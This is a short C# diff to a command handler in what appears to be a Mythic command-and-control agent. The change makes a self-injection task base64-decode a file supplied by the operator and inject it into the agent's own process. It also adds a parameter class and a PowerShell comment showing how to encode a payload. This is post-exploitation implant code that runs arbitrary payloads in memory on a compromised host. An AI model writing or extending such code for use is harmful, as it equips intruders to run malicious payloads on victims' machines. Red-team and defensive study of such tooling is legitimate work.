@@ -1,6 +1,8 @@
 ﻿using Injection;
 using Models.Tasks;
 using Extend;
+using System.Text;
+using System;
 
 namespace Tasks.Commands
 {
@@ -10,9 +12,12 @@ namespace Tasks.Commands
 
         public override MythicTaskResult Execute(MythicTask task)
         {
+            // [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""))
+
+            var arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<SelfInjectParam>();
             MythicTaskResult result;
 
-            var FileBytes = new byte[10];
+            var FileBytes = Convert.FromBase64String(arguments.file);
 
             var injector = new SelfInjector();
             var success = injector.Inject(FileBytes);
@@ -40,6 +45,11 @@ namespace Tasks.Commands
             }
 
             return result;
+        }
+
+        public class SelfInjectParam
+        {
+            public string file { get; set; }
         }
     }
 }
